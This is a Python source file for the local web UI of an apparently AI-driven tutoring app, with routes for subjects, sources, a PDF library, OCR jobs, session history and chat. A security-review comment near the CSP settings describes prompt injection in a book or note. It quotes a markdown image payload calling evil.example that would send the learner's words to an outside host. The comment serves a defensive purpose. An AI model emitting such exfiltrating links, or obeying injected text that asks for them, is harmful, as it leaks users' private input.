"""Front end C: a local web UI (M8): session history, and chat (chat.py) on Claude Code or
the own agent loop.

The server only listens on 127.0.0.1. Requests must name the local server as their host
(against DNS rebinding), and requests that change anything must come from the page itself
(same Origin), so another website open in the browser can't drive it. The vault is only
read here, through the session code.
"""

import asyncio
import contextlib
import json
import mimetypes
import os
import re
import subprocess
from dataclasses import asdict
from datetime import date
from importlib.resources import files
from pathlib import Path

from starlette.applications import Starlette
from starlette.middleware import Middleware
from starlette.middleware.trustedhost import TrustedHostMiddleware
from starlette.requests import Request
from starlette.responses import (
    FileResponse,
    HTMLResponse,
    JSONResponse,
    Response,
    StreamingResponse,
)
from starlette.routing import Mount, Route
from starlette.staticfiles import StaticFiles
from starlette.types import ASGIApp, Receive, Scope, Send

from velocity.chat import ChatError, ChatManager, engines, last_engine
from velocity.config import (
    SUBJECT_COLORS,
    Config,
    ConfigError,
    add_source,
    create_subject,
    delete_subject,
    list_subjects,
    load_subject,
    load_theme,
    remove_source,
    rename_source,
    set_archived,
    set_color,
    set_note_folders,
    set_persona,
    set_subject_name,
)
from velocity.engine import CLAUDE_CODE
from velocity.library import duplicates, entry_id, library, same_book
from velocity.library import find as find_in_library
from velocity.library import remove as remove_from_library
from velocity.pdf_source import PdfSource
from velocity.prepare import (
    SECONDS_PER_PAGE,
    STARTUP_SECONDS,
    read_progress,
    request_cancel,
    running,
)
from velocity.runtime import no_window, self_command
from velocity.session import (
    SESSION_ID,
    Session,
    active_session_id,
    cleanup_candidates,
    record_dir,
    remove_sessions,
    search_sessions,
    session_summaries,
)
from velocity.setup import VelocityApp, settings_routes
from velocity.state import StateError, load_state
from velocity.tools import ToolError, open_source, source_ref
from velocity.uploads import MAX_UPLOAD_BYTES, UploadError, check_content, upload_path

HOST = "127.0.0.1"
DEFAULT_PORT = 8765
ALLOWED_HOSTS = ["127.0.0.1", "localhost"]
_FRONT_MATTER = re.compile(r"\A---\n.*?\n---\n", re.DOTALL)
STATIC = Path(str(files("velocity").joinpath("web_static")))

# The page's libraries are served from here (web_static/vendor/). Windows can map these
# to other types in its registry; a module script with a wrong type doesn't run.
for _type, _suffixes in {
    "text/javascript": (".js", ".mjs"),
    "text/css": (".css",),
    "font/woff2": (".woff2",),
}.items():
    for _suffix in _suffixes:
        mimetypes.add_type(_type, _suffix)


class SameOriginMiddleware:
    """Reject requests that change state unless they come from this server's own page."""

    def __init__(self, app: ASGIApp) -> None:
        self.app = app

    async def __call__(self, scope: Scope, receive: Receive, send: Send) -> None:
        if scope["type"] == "http" and scope["method"] not in (
            "GET",
            "HEAD",
            "OPTIONS",
        ):
            headers = dict(scope["headers"])
            origin = headers.get(b"origin", b"").decode()
            host = headers.get(b"host", b"").decode()
            if origin not in (f"http://{host}", f"https://{host}"):
                response = JSONResponse({"error": "cross-origin request"}, 403)
                await response(scope, receive, send)
                return
        await self.app(scope, receive, send)


# Security review M2 (2026-11-12). Text in a book or note can steer the tutor (prompt
# injection), say into writing ![](https://evil.example/?q=<what the learner said>); the
# browser must fetch nothing from other sites, and run only velocity's own scripts (the
# libraries are bundled, web_static/vendor/). Styles allow inline: KaTeX writes style
# attributes, and styles can't run code.
CSP_DIRECTIVES = (
    "default-src 'self'",
    "script-src 'self'",
    "style-src 'self' 'unsafe-inline'",
    "img-src 'self' data: blob:",
    "font-src 'self' data:",
    "connect-src 'self'",
    "worker-src 'self' blob:",
    "object-src 'none'",
    "base-uri 'none'",
    "form-action 'self'",
    "frame-ancestors 'none'",
)
CONTENT_SECURITY_POLICY = "; ".join(CSP_DIRECTIVES)
SECURITY_HEADERS = [
    (b"content-security-policy", CONTENT_SECURITY_POLICY.encode()),
    (b"x-content-type-options", b"nosniff"),
    (b"referrer-policy", b"no-referrer"),
]


class SecurityHeadersMiddleware:
    """Put the security headers on every response (the outermost middleware, so refusals
    from the others carry them too)."""

    def __init__(self, app: ASGIApp) -> None:
        self.app = app

    async def __call__(self, scope: Scope, receive: Receive, send: Send) -> None:
        if scope["type"] != "http":
            await self.app(scope, receive, send)
            return

        async def send_with_headers(message: dict) -> None:
            if message["type"] == "http.response.start":
                message = {
                    **message,
                    "headers": [*message.get("headers", []), *SECURITY_HEADERS],
                }
            await send(message)

        await self.app(scope, receive, send_with_headers)


class RevalidatePageMiddleware:
    """Make the browser ask for the page and its scripts each time (`no-cache`), so it
    never mixes a new page with old scripts after velocity is updated. An unchanged file
    still isn't sent again: StaticFiles answers 304 to the ETag. Books are left alone."""

    def __init__(self, app: ASGIApp) -> None:
        self.app = app

    async def __call__(self, scope: Scope, receive: Receive, send: Send) -> None:
        path = scope.get("path", "") if scope["type"] == "http" else None
        if path != "/" and not (path or "").startswith("/static/"):
            await self.app(scope, receive, send)
            return

        async def send_revalidating(message: dict) -> None:
            if message["type"] == "http.response.start":
                headers = list(message.get("headers", []))
                headers.append((b"cache-control", b"no-cache"))
                message = {**message, "headers": headers}
            await send(message)

        await self.app(scope, receive, send_revalidating)


def page() -> HTMLResponse:
    """The page, with the theme chosen in Settings on <html> so it is drawn in the right
    colors from the start; "system" leaves it to the system's light or dark setting."""
    html = (STATIC / "index.html").read_text(encoding="utf-8")
    theme = load_theme()
    if theme != "system":
        html = html.replace(
            '<html lang="en">', f'<html lang="en" data-theme="{theme}">', 1
        )
    return HTMLResponse(html)


MIDDLEWARE = [
    Middleware(SecurityHeadersMiddleware),
    Middleware(TrustedHostMiddleware, allowed_hosts=ALLOWED_HOSTS),
    Middleware(SameOriginMiddleware),
    Middleware(RevalidatePageMiddleware),
]


def build_app(
    config: Config, chats: ChatManager | None = None, host: VelocityApp | None = None
) -> Starlette:
    """The full app on `config`. `host` (velocity web's VelocityApp) rebuilds it when
    the settings are saved; without it (tests), settings are saved but the app is not
    rebuilt."""
    chats = chats or ChatManager(config)

    def subject_or_404(slug: str):
        try:
            return load_subject(config, slug)
        except ConfigError:
            return None

    async def index(request: Request) -> Response:
        return page()

    async def subjects(request: Request) -> Response:
        out = []
        for slug in list_subjects(config):
            subject = load_subject(config, slug)
            out.append(
                {
                    "slug": slug,
                    "name": subject.name,
                    "sources": [s.name for s in subject.sources],
                    "archived": subject.archived,
                    "color": subject.display_color,
                    "sessions": len(list(record_dir(slug).glob("*.jsonl"))),
                }
            )
        return JSONResponse(out)

    # -- managing subjects (M10) ---------------------------------------------------------

    async def subject_create(request: Request) -> Response:
        name = str((await _json(request)).get("name") or "").strip()
        if not name:
            return JSONResponse({"error": "Give the subject a name."}, 400)
        try:
            subject = create_subject(config, name)
        except ConfigError as e:
            if "already exists" in str(e):
                return JSONResponse(
                    {"error": "There is already a subject with that name."}, 409
                )
            return JSONResponse({"error": str(e)}, 400)
        return JSONResponse({"slug": subject.slug, "name": subject.name})

    def settings_of(subject) -> dict:
        return {
            "slug": subject.slug,
            "name": subject.name,
            "persona": subject.persona.strip("\n"),
            "note_folders": [
                f.relative_to(config.vault_path).as_posix()
                for f in subject.note_folders
            ],
            "archived": subject.archived,
            # Its own color (None: picked automatically), the one shown, and the choices.
            "color": subject.color,
            "display_color": subject.display_color,
            "colors": list(SUBJECT_COLORS),
            "folder": subject.dir.as_posix(),
            "sources": [
                {
                    "name": s.name,
                    "kind": _source_kind(s),
                    "filename": s.path.name,
                    "missing": not s.path.is_file(),
                }
                for s in subject.sources
            ],
        }

    async def subject_settings(request: Request) -> Response:
        subject = subject_or_404(request.path_params["slug"])
        if subject is None:
            return JSONResponse({"error": "unknown subject"}, 404)
        if request.method == "GET":
            return JSONResponse(settings_of(subject))
        body = await _json(request)
        try:
            if "name" in body:
                subject = set_subject_name(config, subject.slug, str(body["name"]))
            if "persona" in body:
                subject = set_persona(config, subject.slug, str(body["persona"]))
            if "note_folders" in body:
                folders = [str(f) for f in body["note_folders"] or []]
                subject = set_note_folders(config, subject.slug, folders)
            if "color" in body:
                color = body["color"]
                subject = set_color(
                    config, subject.slug, str(color) if color is not None else None
                )
        except ConfigError as e:
            return JSONResponse({"error": str(e)}, 400)
        return JSONResponse(settings_of(subject))

    def session_open(subject) -> bool:
        return (
            subject.slug in chats.chats or active_session_id(subject.slug) is not None
        )

    async def subject_archive(request: Request) -> Response:
        """Archive a subject (hidden, everything kept), or recover it."""
        subject = subject_or_404(request.path_params["slug"])
        if subject is None:
            return JSONResponse({"error": "unknown subject"}, 404)
        archived = bool((await _json(request)).get("archived", True))
        if archived and session_open(subject):
            return JSONResponse(
                {"error": "A session of this subject is open. End or pause it first."},
                409,
            )
        return JSONResponse(settings_of(set_archived(config, subject.slug, archived)))

    async def cleanup_list(request: Request) -> Response:
        """Empty and wrap-up-only sessions in every subject, for Settings."""
        out = []
        for slug in list_subjects(config):
            subject = subject_or_404(slug)
            if subject is None:
                continue
            for c in cleanup_candidates(subject.slug, subject.sessions_dir):
                out.append({"subject": slug, "subject_name": subject.name, **asdict(c)})
        return JSONResponse(out)

    async def cleanup_remove(request: Request) -> Response:
        """Remove the listed sessions: each only if the cleanup would still remove it."""
        wanted = (await _json(request)).get("sessions")
        if not isinstance(wanted, list):
            return JSONResponse({"error": "Give the sessions to remove."}, 400)
        by_subject: dict[str, list[str]] = {}
        for item in wanted:
            if isinstance(item, dict) and SESSION_ID.match(str(item.get("id", ""))):
                by_subject.setdefault(str(item.get("subject")), []).append(item["id"])
        removed = 0
        for slug, ids in by_subject.items():
            subject = subject_or_404(slug)
            if subject is not None:
                removed += remove_sessions(subject.slug, subject.sessions_dir, ids)
        return JSONResponse({"removed": removed})

    async def subject_delete(request: Request) -> Response:
        """Delete an archived subject, once the learner has typed its name."""
        subject = subject_or_404(request.path_params["slug"])
        if subject is None:
            return JSONResponse({"error": "unknown subject"}, 404)
        if str((await _json(request)).get("confirm") or "").strip() != subject.name:
            return JSONResponse({"error": "Type the subject's name to delete it."}, 400)
        if session_open(subject):
            return JSONResponse({"error": "A session of this subject is open."}, 409)
        try:
            await asyncio.to_thread(delete_subject, config, subject.slug)
        except ConfigError as e:
            return JSONResponse({"error": str(e)}, 400)
        return JSONResponse({"deleted": subject.slug})

    async def vault_folders(request: Request) -> Response:
        """Folders in the vault the tutor could be allowed to read (for the note folder
        picker): not hidden, not inside Tutor/."""
        return JSONResponse(await asyncio.to_thread(list_vault_folders, config))

    async def sessions(request: Request) -> Response:
        subject = subject_or_404(request.path_params["slug"])
        if subject is None:
            return JSONResponse({"error": "unknown subject"}, 404)
        query = request.query_params.get("q", "").strip()
        if query:
            return JSONResponse(await asyncio.to_thread(session_search, subject, query))
        return JSONResponse(session_list(subject))

    async def session_log(request: Request) -> Response:
        subject = subject_or_404(request.path_params["slug"])
        session_id = request.path_params["session_id"]
        if subject is None or not SESSION_ID.match(session_id):
            return JSONResponse({"error": "unknown session"}, 404)
        session = Session(
            subject.slug, session_id, record_dir(subject.slug), subject.sessions_dir
        )
        if not session.record_path.exists():
            return JSONResponse({"error": "unknown session"}, 404)
        from_log = session.log_path.exists()
        text = (
            session.log_path.read_text(encoding="utf-8")
            if from_log
            else session.rendered_text()
        )
        return JSONResponse(
            {
                "id": session_id,
                "markdown": _FRONT_MATTER.sub("", text, count=1),
                # Without the markdown log, the record is shown (learner edits are lost).
                "from_log": from_log,
            }
        )

    # -- source reader -----------------------------------------------------------------

    outlines: dict[tuple[str, float], list[dict]] = {}  # (path, mtime) -> outline

    def outline_of(subject, ref) -> list[dict]:
        key = (ref.path.as_posix(), ref.path.stat().st_mtime)
        if key not in outlines:
            source = open_source(subject, ref.name)
            outlines[key] = [asdict(s) for s in source.outline()]
        return outlines[key]

    async def progress(request: Request) -> Response:
        """The learner state for the Progress tab (show-only: the tutor is its writer)."""
        subject = subject_or_404(request.path_params["slug"])
        if subject is None:
            return JSONResponse({"error": "unknown subject"}, 404)
        try:
            state = load_state(subject.dir)
        except (StateError, OSError, ValueError) as e:
            return JSONResponse({"error": f"Could not read the progress: {e}"}, 500)
        return JSONResponse(state.progress_view(date.today()))

    async def source_list(request: Request) -> Response:
        """The subject's sources with their outlines, for the reader's picker."""
        subject = subject_or_404(request.path_params["slug"])
        if subject is None:
            return JSONResponse({"error": "unknown subject"}, 404)
        out = []
        for ref in subject.sources:
            item = {"name": ref.name, "kind": _source_kind(ref), "outline": []}
            try:
                item["outline"] = await asyncio.to_thread(outline_of, subject, ref)
            except ToolError as e:
                item["error"] = str(e)
            except (OSError, ValueError, KeyError) as e:
                item["error"] = f"Could not read {ref.name}: {e}"
            out.append(item)
        return JSONResponse(out)

    async def source_upload(request: Request) -> Response:
        """Add a source from the page: the file's bytes are the request body (no form
        encoding), with its name and the source's name in the query string."""
        subject = subject_or_404(request.path_params["slug"])
        if subject is None:
            return JSONResponse({"error": "unknown subject"}, 404)
        name = request.query_params.get("name", "").strip()
        filename = request.query_params.get("filename", "")
        if not name:
            return JSONResponse({"error": "Give the source a name."}, 400)
        if any(s.name == name for s in subject.sources):
            return JSONResponse(
                {"error": f"{subject.name} already has a source named {name!r}."}, 409
            )
        try:
            path = upload_path(filename)
            await receive_upload(request, path)
            added = await asyncio.to_thread(
                add_source, config, subject.slug, path, name
            )
        except UploadError as e:
            return JSONResponse({"error": str(e)}, e.status)
        except ConfigError as e:
            path.unlink(missing_ok=True)
            return JSONResponse({"error": str(e)}, 400)
        return JSONResponse(await asyncio.to_thread(describe_added, subject, added))

    async def receive_upload(request: Request, path) -> None:
        """Write the body to `path` (through a .part file), within the size limit, and
        check that the content matches the type."""
        part = path.with_name(path.name + ".part")
        await asyncio.to_thread(part.parent.mkdir, parents=True, exist_ok=True)
        handle = await asyncio.to_thread(open, part, "wb")
        size = 0
        try:
            async for chunk in request.stream():
                size += len(chunk)
                if size > MAX_UPLOAD_BYTES:
                    raise UploadError("The file is larger than 1 GB.", 413)
                await asyncio.to_thread(handle.write, chunk)
        except BaseException:
            await asyncio.to_thread(handle.close)
            part.unlink(missing_ok=True)
            raise
        await asyncio.to_thread(handle.close)
        try:
            await asyncio.to_thread(check_content, part, path.suffix)
        except UploadError:
            part.unlink(missing_ok=True)
            raise
        part.replace(path)

    def describe_added(subject, added) -> dict:
        """What the page shows after an upload: the source, and how many sections the
        tutor can find in it (a warning if none)."""
        kind = _source_kind(added)
        try:
            sections = len(
                open_source(load_subject(config, subject.slug), added.name).outline()
            )
        except Exception:  # noqa: BLE001 - a broken file can fail in many ways
            return {
                "name": added.name,
                "kind": kind,
                "sections": 0,
                "warning": "Its contents couldn't be read; check the file, or remove it "
                "from subject.toml.",
            }
        warning = None
        if not sections:
            warning = (
                "No table of contents (bookmarks) was found, so the tutor can't find its "
                "sections; it can still search it and look at its pages."
                if kind == "pdf"
                else "No headings or table of contents were found, so the tutor can't "
                "find its sections."
            )
        return {
            "name": added.name,
            "kind": kind,
            "sections": sections,
            "warning": warning,
        }

    # -- the sources library (M10) -------------------------------------------------------

    def library_json() -> list[dict]:
        entries = library(config)
        copies = duplicates(entries)
        return [
            {**e.as_json(), "duplicate_of": copies.get(e.id), "job": job_of(e)}
            for e in entries
        ]

    def job_of(entry) -> dict | None:
        """A PDF's preparing job, started here or from a subject, for the Library tab:
        its progress (any state), or {"state": "starting"} while it loads."""
        if entry.kind != "pdf":
            return None
        progress = read_progress(PdfSource(entry.path, ocr=None))
        process = prepare_processes.get(entry.path.as_posix())
        launched = process is not None and process.poll() is None
        if launched and not (progress and progress["state"] == "running"):
            return {"state": "starting"}
        return progress

    async def library_list(request: Request) -> Response:
        return JSONResponse(await asyncio.to_thread(library_json))

    async def library_upload(request: Request) -> Response:
        """Add a book to the library only, for any subject to use later: the file's bytes
        are the body, its name in the query string. The same file twice is refused."""
        try:
            path = upload_path(request.query_params.get("filename", ""))
            await receive_upload(request, path)
        except UploadError as e:
            return JSONResponse({"error": str(e)}, e.status)
        same = await asyncio.to_thread(same_book, config, path)
        if same is not None:
            await asyncio.to_thread(path.unlink, missing_ok=True)
            return JSONResponse(
                {
                    "error": f"This book is already in your library, as {same.path.name}."
                },
                409,
            )
        added = next(
            e
            for e in await asyncio.to_thread(library_json)
            if e["id"] == entry_id(path)
        )
        return JSONResponse(added)

    async def library_remove(request: Request) -> Response:
        """Remove an unused book from the library (the Library tab)."""
        try:
            done = await asyncio.to_thread(
                remove_from_library, config, request.path_params["entry"]
            )
        except ConfigError as e:
            return JSONResponse({"error": str(e)}, 400)
        return JSONResponse(done)

    async def source_from_library(request: Request) -> Response:
        """Add a book from the library to a subject: the same file, no new upload."""
        subject = subject_or_404(request.path_params["slug"])
        if subject is None:
            return JSONResponse({"error": "unknown subject"}, 404)
        body = await _json(request)
        name = str(body.get("name") or "").strip()
        if not name:
            return JSONResponse({"error": "Give the source a name."}, 400)
        try:
            entry = await asyncio.to_thread(
                find_in_library, config, str(body.get("id"))
            )
            added = await asyncio.to_thread(
                add_source, config, subject.slug, entry.path, name
            )
        except ConfigError as e:
            return JSONResponse({"error": str(e)}, 400)
        return JSONResponse(await asyncio.to_thread(describe_added, subject, added))

    async def source_remove(request: Request) -> Response:
        """Take a source out of a subject; the file stays in the library."""
        subject = subject_or_404(request.path_params["slug"])
        if subject is None:
            return JSONResponse({"error": "unknown subject"}, 404)
        try:
            remove_source(config, subject.slug, request.path_params["name"])
        except ConfigError as e:
            return JSONResponse({"error": str(e)}, 400)
        return JSONResponse({"removed": request.path_params["name"]})

    async def source_rename(request: Request) -> Response:
        subject = subject_or_404(request.path_params["slug"])
        if subject is None:
            return JSONResponse({"error": "unknown subject"}, 404)
        new_name = str((await _json(request)).get("name") or "")
        try:
            renamed = rename_source(
                config, subject.slug, request.path_params["name"], new_name
            )
        except ConfigError as e:
            return JSONResponse({"error": str(e)}, 400)
        return JSONResponse({"name": renamed.name})

    def reader_source(request: Request):
        """(subject, source ref) for a reader request, or an error response."""
        subject = subject_or_404(request.path_params["slug"])
        if subject is None:
            return None, JSONResponse({"error": "unknown subject"}, 404)
        try:
            # By name only: the path comes from subject.toml, never from the request.
            return (subject, source_ref(subject, request.path_params["name"])), None
        except ToolError as e:
            return None, JSONResponse({"error": str(e)}, 404)

    async def source_file(request: Request) -> Response:
        """A PDF source's file, for PDF.js (which fetches it in ranges)."""
        found, error = reader_source(request)
        if error:
            return error
        _, ref = found
        if _source_kind(ref) != "pdf":
            return JSONResponse({"error": "only PDF sources are sent as files"}, 400)
        return FileResponse(ref.path, media_type="application/pdf")

    async def source_section(request: Request) -> Response:
        """A text source's section as markdown (PDFs are shown as pages instead)."""
        found, error = reader_source(request)
        if error:
            return error
        subject, ref = found
        if _source_kind(ref) != "text":
            return JSONResponse({"error": "PDF sources are shown as pages"}, 400)
        try:
            section = await asyncio.to_thread(
                open_source(subject, ref.name).read_section,
                request.path_params["section_id"],
            )
        except KeyError:
            return JSONResponse({"error": "unknown section"}, 404)
        return JSONResponse(
            {"id": section.id, "title": section.title, "markdown": section.markdown}
        )

    # -- preparing a PDF ahead of time (OCR) --------------------------------------------

    prepare_processes: dict[
        str, subprocess.Popen
    ] = {}  # source path -> job just started

    def reader_pdf(request: Request):
        """(subject, ref, PdfSource) for a PDF source, or an error response."""
        found, error = reader_source(request)
        if error:
            return None, error
        subject, ref = found
        if _source_kind(ref) != "pdf":
            return None, JSONResponse({"error": "only PDFs are prepared"}, 400)
        return (subject, ref, PdfSource(ref.path, ocr=None)), None

    def prepare_status(ref, pdf: PdfSource) -> dict:
        process = prepare_processes.get(ref.path.as_posix())
        progress = read_progress(pdf)
        starting = (
            process is not None
            and process.poll() is None
            and not (progress and progress["state"] == "running")
        )
        return {
            "pages": pdf.page_count,
            "prepared": pdf.cached_pages(),
            # Prepared before the dropped-text check existed (velocity source recheck).
            "unchecked": len(pdf.unchecked_pages()),
            "progress": progress,
            "starting": starting,  # launched, still loading before its first update
            "seconds_per_page": SECONDS_PER_PAGE,
            "startup_seconds": STARTUP_SECONDS,
        }

    async def prepare_get(request: Request) -> Response:
        found, error = reader_pdf(request)
        if error:
            return error
        _, ref, pdf = found
        return JSONResponse(await asyncio.to_thread(prepare_status, ref, pdf))

    async def prepare_start(request: Request) -> Response:
        """Start `velocity source prepare` for a chapter or the whole book, or `velocity
        source recheck` (body {"recheck": "unchecked" | "all"}), detached, so it keeps
        running if the page closes or the server stops."""
        found, error = reader_pdf(request)
        if error:
            return error
        subject, ref, pdf = found
        body = await _json(request)
        process = prepare_processes.get(ref.path.as_posix())
        if running(pdf) or (process is not None and process.poll() is None):
            return JSONResponse({"error": "Already preparing this source."}, 409)
        command = ["prepare", "--all"]
        if body.get("recheck") in ("unchecked", "all"):
            command = ["recheck"] + (["--all"] if body["recheck"] == "all" else [])
        elif body.get("section"):
            section = str(body["section"])
            if not any(s.id == section for s in pdf.outline()):
                return JSONResponse({"error": "unknown section"}, 404)
            command = ["prepare", "--section", section]
        await asyncio.to_thread(launch_prepare, subject, ref, pdf, command)
        return JSONResponse(await asyncio.to_thread(prepare_status, ref, pdf))

    def launch_prepare(subject, ref, pdf: PdfSource, command: list[str]) -> None:
        """Run `velocity source <prepare|recheck> <subject> --source <name> ...`."""
        launch_job([subject.slug, "--source", ref.name], ref.path, pdf, command)

    def launch_job(target: list[str], path, pdf: PdfSource, command: list[str]) -> None:
        """Run `velocity source <prepare|recheck> <target...> <options...>`, detached.
        `target` names the PDF: a subject and source, or `--file <path>`."""
        verb, *options = command
        pdf.cache_dir.mkdir(parents=True, exist_ok=True)
        with open(pdf.cache_dir / "prepare.log", "w", encoding="utf-8") as log:
            prepare_processes[path.as_posix()] = subprocess.Popen(
                self_command("source", verb, *target, *options),
                stdin=subprocess.DEVNULL,
                stdout=log,
                stderr=subprocess.STDOUT,
                start_new_session=True,  # not stopped with the server
                creationflags=no_window(),  # no console window on Windows
            )

    async def prepare_cancel(request: Request) -> Response:
        """Ask the job to stop after its current batch (finished pages are kept)."""
        found, error = reader_pdf(request)
        if error:
            return error
        _, ref, pdf = found
        request_cancel(pdf)
        return JSONResponse(prepare_status(ref, pdf))

    # Preparing a library book (the Library tab): the whole book, by its library id. The
    # prepared pages are kept per file, so the subjects using it (now or later) share them.

    def library_pdf(request: Request):
        """(entry, PdfSource) for a PDF in the library, or an error response."""
        try:
            entry = find_in_library(config, request.path_params["entry"])
        except ConfigError as e:
            return None, JSONResponse({"error": str(e)}, 404)
        if entry.kind != "pdf":
            return None, JSONResponse({"error": "only PDFs are prepared"}, 400)
        return (entry, PdfSource(entry.path, ocr=None)), None

    async def library_prepare(request: Request) -> Response:
        """GET: how much is prepared, and the job's progress. POST: prepare the rest."""
        found, error = await asyncio.to_thread(library_pdf, request)
        if error:
            return error
        entry, pdf = found
        if request.method == "POST":
            process = prepare_processes.get(entry.path.as_posix())
            if running(pdf) or (process is not None and process.poll() is None):
                return JSONResponse({"error": "Already preparing this book."}, 409)
            await asyncio.to_thread(
                launch_job,
                ["--file", entry.path.as_posix()],
                entry.path,
                pdf,
                ["prepare", "--all"],
            )
        return JSONResponse(await asyncio.to_thread(prepare_status, entry, pdf))

    async def library_prepare_cancel(request: Request) -> Response:
        found, error = await asyncio.to_thread(library_pdf, request)
        if error:
            return error
        entry, pdf = found
        request_cancel(pdf)
        return JSONResponse(await asyncio.to_thread(prepare_status, entry, pdf))

    # -- chat --------------------------------------------------------------------------

    async def engine_list(request: Request) -> Response:
        return JSONResponse(engines(config))

    async def chat_status(request: Request) -> Response:
        subject = subject_or_404(request.path_params["slug"])
        if subject is None:
            return JSONResponse({"error": "unknown subject"}, 404)
        return JSONResponse(chats.status(subject))

    async def chat_start(request: Request) -> Response:
        subject = subject_or_404(request.path_params["slug"])
        if subject is None:
            return JSONResponse({"error": "unknown subject"}, 404)
        body = await _json(request)
        try:
            await chats.start(
                subject,
                model=str(body.get("model") or "sonnet"),
                resume=body.get("resume") or None,
                continues=body.get("continues") or None,
                close_other=bool(body.get("close_other")),
                engine=str(body.get("engine") or CLAUDE_CODE),
            )
        except ChatError as e:
            return JSONResponse({"error": str(e)}, e.status)
        return JSONResponse(chats.status(subject))

    async def chat_message(request: Request) -> Response:
        subject = subject_or_404(request.path_params["slug"])
        if subject is None:
            return JSONResponse({"error": "unknown subject"}, 404)
        text = str((await _json(request)).get("text") or "").strip()
        if not text:
            return JSONResponse({"error": "empty message"}, 400)
        if subject.slug not in chats.chats:
            return JSONResponse({"error": "No chat is open for this subject."}, 409)

        async def events():
            async for event in chats.send(subject, text):
                yield f"data: {json.dumps(asdict(event))}\n\n"

        return StreamingResponse(events(), media_type="text/event-stream")

    async def chat_stop(request: Request) -> Response:
        subject = subject_or_404(request.path_params["slug"])
        if subject is None:
            return JSONResponse({"error": "unknown subject"}, 404)
        await chats.stop_reply(subject)
        return JSONResponse({"ok": True})

    async def chat_pause(request: Request) -> Response:
        subject = subject_or_404(request.path_params["slug"])
        if subject is None:
            return JSONResponse({"error": "unknown subject"}, 404)
        await chats.pause(subject)
        return JSONResponse(chats.status(subject))

    @contextlib.asynccontextmanager
    async def lifespan(app: Starlette):
        async def pause_idle_chats():
            while True:
                await asyncio.sleep(60)
                await chats.pause_idle()

        task = asyncio.create_task(pause_idle_chats())
        try:
            yield
        finally:
            task.cancel()
            await chats.shutdown()  # stopping the server pauses open chats

    routes = [
        Route("/", index),
        Route("/api/subjects", subjects),
        Route("/api/subjects", subject_create, methods=["POST"]),
        Route(
            "/api/subjects/{slug}/settings", subject_settings, methods=["GET", "POST"]
        ),
        Route("/api/subjects/{slug}/archive", subject_archive, methods=["POST"]),
        Route("/api/subjects/{slug}/delete", subject_delete, methods=["POST"]),
        Route("/api/vault/folders", vault_folders),
        Route("/api/library", library_list),
        Route("/api/library", library_upload, methods=["POST"]),
        Route("/api/library/{entry}/prepare", library_prepare, methods=["GET", "POST"]),
        Route(
            "/api/library/{entry}/prepare/cancel",
            library_prepare_cancel,
            methods=["POST"],
        ),
        Route("/api/library/{entry}/remove", library_remove, methods=["POST"]),
        Route(
            "/api/subjects/{slug}/sources/library",
            source_from_library,
            methods=["POST"],
        ),
        Route(
            "/api/subjects/{slug}/sources/{name}/remove",
            source_remove,
            methods=["POST"],
        ),
        Route(
            "/api/subjects/{slug}/sources/{name}/rename",
            source_rename,
            methods=["POST"],
        ),
        Route("/api/engines", engine_list),
        Route("/api/subjects/{slug}/sources", source_list),
        Route("/api/subjects/{slug}/sources", source_upload, methods=["POST"]),
        Route("/api/subjects/{slug}/sources/{name}/file", source_file),
        Route(
            "/api/subjects/{slug}/sources/{name}/sections/{section_id}",
            source_section,
        ),
        Route("/api/subjects/{slug}/sources/{name}/prepare", prepare_get),
        Route(
            "/api/subjects/{slug}/sources/{name}/prepare",
            prepare_start,
            methods=["POST"],
        ),
        Route(
            "/api/subjects/{slug}/sources/{name}/prepare/cancel",
            prepare_cancel,
            methods=["POST"],
        ),
        Route("/api/cleanup/sessions", cleanup_list),
        Route("/api/cleanup/sessions", cleanup_remove, methods=["POST"]),
        Route("/api/subjects/{slug}/progress", progress),
        Route("/api/subjects/{slug}/sessions", sessions),
        Route("/api/subjects/{slug}/sessions/{session_id}", session_log),
        Route("/api/subjects/{slug}/chat", chat_status),
        Route("/api/subjects/{slug}/chat/start", chat_start, methods=["POST"]),
        Route("/api/subjects/{slug}/chat/message", chat_message, methods=["POST"]),
        Route("/api/subjects/{slug}/chat/pause", chat_pause, methods=["POST"]),
        Route("/api/subjects/{slug}/chat/stop", chat_stop, methods=["POST"]),
        Mount("/static", StaticFiles(directory=STATIC), name="static"),
    ]
    routes += settings_routes(
        lambda: config,
        host.reload if host else None,
        can_save=lambda: not chats.chats,
    )
    app = Starlette(routes=routes, middleware=MIDDLEWARE, lifespan=lifespan)
    app.state.chats = chats
    return app


def build_setup_app(host: VelocityApp) -> Starlette:
    """Before velocity is set up (no config): the page, which shows the setup screen,
    and the settings that create the config."""

    async def index(request: Request) -> Response:
        return page()

    routes = [
        Route("/", index),
        Mount("/static", StaticFiles(directory=STATIC), name="static"),
        *settings_routes(lambda: None, host.reload),
    ]
    return Starlette(routes=routes, middleware=MIDDLEWARE)


def serve_app(config: Config | None) -> VelocityApp:
    """What `velocity web` runs: setup first if needed, then the full app."""
    return VelocityApp(
        config,
        lambda cfg, host: build_app(cfg, host=host),
        build_setup_app,
    )


MAX_VAULT_FOLDERS = 2000


def list_vault_folders(config) -> list[str]:
    """The vault's folders, relative to it, sorted; hidden folders (.obsidian, .trash)
    and the tutor's own Tutor/ folder are left out."""
    folders = []
    vault = config.vault_path
    for root, dirs, _ in os.walk(vault):
        dirs[:] = sorted(
            d
            for d in dirs
            if not d.startswith(".") and Path(root, d) != config.tutor_dir
        )
        for d in dirs:
            folders.append(Path(root, d).relative_to(vault).as_posix())
            if len(folders) >= MAX_VAULT_FOLDERS:
                return folders
    return folders


def _source_kind(ref) -> str:
    return "pdf" if ref.path.suffix.lower() == ".pdf" else "text"


async def _json(request: Request) -> dict:
    try:
        body = await request.json()
    except ValueError:
        return {}
    return body if isinstance(body, dict) else {}


def session_list(subject) -> list[dict]:
    """The subject's sessions, newest first, with a short summary of each. Paused sessions
    also say which engine and model ran them last, the defaults for resuming them."""
    return [
        _session_item(subject, s)
        for s in session_summaries(subject.slug, subject.sessions_dir)
    ]


def session_search(subject, query: str) -> list[dict]:
    """The sessions a History search finds (decided 2026-11-10): name matches first,
    then text matches with a snippet."""
    return [
        {
            **_session_item(subject, m.session),
            "match": "title" if m.in_title else "text",
            "snippet": m.snippet,
        }
        for m in search_sessions(subject.slug, subject.sessions_dir, query)
    ]


def _session_item(subject, s) -> dict:
    item = asdict(s)
    if s.ended == "no-wrap-up":
        session = Session(
            subject.slug, s.id, record_dir(subject.slug), subject.sessions_dir
        )
        item["last_engine"] = last_engine(subject, session)
    return item
